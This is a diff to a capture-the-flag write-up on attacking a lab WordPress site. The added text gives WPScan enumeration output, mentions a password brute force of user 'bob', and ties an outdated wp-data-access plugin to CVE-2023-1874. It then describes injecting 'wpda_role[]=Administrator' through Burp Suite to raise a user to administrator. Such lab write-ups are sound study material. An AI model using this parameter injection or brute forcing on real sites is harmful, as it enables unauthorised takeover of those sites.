@@ -101,15 +101,15 @@ Finished
 ```bash
 [+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).
  | Found By: Rss Generator (Passive Detection)
- |  - http://10.10.194.162/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
- |  - http://10.10.194.162/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
+ |  - http://<IP>/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
+ |  - http://<IP>/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
 
 [+] WordPress theme in use: twentytwentyfour
- | Location: http://10.10.194.162/wordpress/wp-content/themes/twentytwentyfour/
+ | Location: http://<IP>/wordpress/wp-content/themes/twentytwentyfour/
  | Last Updated: 2024-07-16T00:00:00.000Z
- | Readme: http://10.10.194.162/wordpress/wp-content/themes/twentytwentyfour/readme.txt
+ | Readme: http://<IP>/wordpress/wp-content/themes/twentytwentyfour/readme.txt
  | [!] The version is out of date, the latest version is 1.2
- | Style URL: http://10.10.194.162/wordpress/wp-content/themes/twentytwentyfour/style.css
+ | Style URL: http://<IP>/wordpress/wp-content/themes/twentytwentyfour/style.css
  | Style Name: Twenty Twenty-Four
  | Style URI: https://wordpress.org/themes/twentytwentyfour/
  | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
@@ -120,7 +120,7 @@ Finished
  |
  | Version: 1.0 (80% confidence)
  | Found By: Style (Passive Detection)
- |  - http://10.10.194.162/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'
+ |  - http://<IP>/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'
 
 [+] Enumerating Users (via Passive and Aggressive Methods)
  Brute Forcing Author IDs - Time: 00:00:10 <===========> (100 / 100) 100.00% Time: 00:00:10
@@ -135,7 +135,7 @@ Finished
  | Confirmed By:
  |  Rss Generator (Passive Detection)
  |  Wp Json Api (Aggressive Detection)
- |   - http://10.10.194.162/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |   - http://<IP>/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  |  Login Error Messages (Aggressive Detection)
 
@@ -156,6 +156,57 @@ Trying bob / angel Time: 00:00:01 <                 > (36 / 14344428)  0.00%  ET
 ```
 ---> We've found the password and use it to login again /wp-admin.
 
++ We look around main page wordpress but no more feartures we can use because we are in role normal user not role Administrator.
 
+![alt text](image-2.png)
+
++ Look again information which we scan by WpScan that are Plugins and Themes:
+
+```bash
+[+] WordPress theme in use: twentytwentyfour
+ | Location: http://<IP>/wordpress/wp-content/themes/twentytwentyfour/
+ | Last Updated: 2024-07-16T00:00:00.000Z
+ | Readme: http://<IP>/wordpress/wp-content/themes/twentytwentyfour/readme.txt
+ | [!] The version is out of date, the latest version is 1.2
+ | Style URL: http://<IP>/wordpress/wp-content/themes/twentytwentyfour/style.css
+ | Style Name: Twenty Twenty-Four
+ | Style URI: https://wordpress.org/themes/twentytwentyfour/
+ | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://<IP>/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'
+```
+
+```bash
+[i] Plugin(s) Identified:
+
+[+] wp-data-access
+ | Location: http://<IP>/wordpress/wp-content/plugins/wp-data-access/
+ | Last Updated: 2024-10-17T00:01:00.000Z
+ | [!] The version is out of date, the latest version is 5.5.16
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 5.3.5 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://<IP>/wordpress/wp-content/plugins/wp-data-access/readme.txt
+```
+
+--> We've known the both are out date so maybe they will have the vulnerable we can manipulate.
+
++ First we will research and find the vulnerable plugin "wp-data-access" version 5.3.5 because we are still no access the fearture theme "twentytwentyfour".
++ We've found the vulnerable "wp-data-access" --> CVE-2023-1874
++ Link: https://www.wordfence.com/blog/2023/04/privilege-escalation-vulnerability-patched-promptly-in-wp-data-access-wordpress-plugin/
++ We are able to use 'wpda_role[]' parameter to modify user role to role Administrator.
++ Using Burpsuite to intercept:
+
+
+
++ We add "wpda_role[]=Administrator" into code:
 
 
